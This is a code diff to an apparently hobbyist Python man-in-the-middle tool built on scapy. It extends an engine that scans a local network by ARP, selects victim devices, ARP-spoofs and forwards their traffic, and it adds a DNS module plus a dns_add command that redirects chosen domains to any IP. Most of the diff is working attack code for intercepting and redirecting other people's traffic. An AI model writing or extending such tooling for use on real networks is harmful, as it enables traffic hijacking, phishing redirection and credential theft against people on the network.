@@ -1,9 +1,11 @@
 from scapy.all import *
 from scapy.layers.l2 import *
 import threading
+import ipaddress
 from engine.arp import ARPSpoofer
 from engine.forwarder import Forwarder
 from engine.modules.logger import LoggerModule
+from engine.modules.dns import DNSModule
 
 class MITMEngine:
     def __init__(self):
@@ -41,14 +43,14 @@ class MITMEngine:
         self.network_devices.clear()
         ip_range = ".".join(self.gateway_ip.split(".")[:3]) + ".0/24"
         packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
-        result = srp(packet, timeout=3, verbose=0)[0]
+        result = srp(packet, timeout=5, retry=2, verbose=0)[0]
         for sent, received in result:
             self.network_devices.append({"ip": received.psrc, "mac": received.hwsrc})
         for index, device in enumerate(self.network_devices):
             marker = "[V]" if device in self.targets else "   "
             print(f"{index}. {marker} {device['ip']} : {device['mac']}")
 
-    def set_target(self, args):
+    def add_target(self, args):
         if len(args) != 1 or not args[0].isdigit() or int(args[0]) >= len(self.network_devices):
             print("Error! Provide a valid device index from scan.")
             return
@@ -99,7 +101,8 @@ class MITMEngine:
 
     def add_module(self, args):
         available = {
-            "logger": LoggerModule
+            "logger": LoggerModule,
+            "dns": DNSModule,
         }
         if len(args) != 1 or args[0] not in available:
             print("Available modules: " + ", ".join(available.keys()))
@@ -107,5 +110,21 @@ class MITMEngine:
         module = available[args[0]]()
         if self.spoofing:
             module.start()
-        self.modules.append(available[args[0]]())
+        self.modules.append(module)
         print(f"Module '{args[0]}' added.")
+
+    def dns_add(self, args):
+        if len(args) != 2:
+            print("Invalid arguments, try dns_add <Domain> <IP>.")
+            return
+        try:
+            ipaddress.ip_address(args[1])
+            for module in self.modules:
+                if isinstance(module, DNSModule):
+                    module.add_spoof(args[0], args[1])
+                    print(f"Spoofing {args[0]} -> {args[1]}")
+                    return
+            print("DNS module not loaded.")
+        except ValueError:
+            print("Invalid IP address!")
+            return
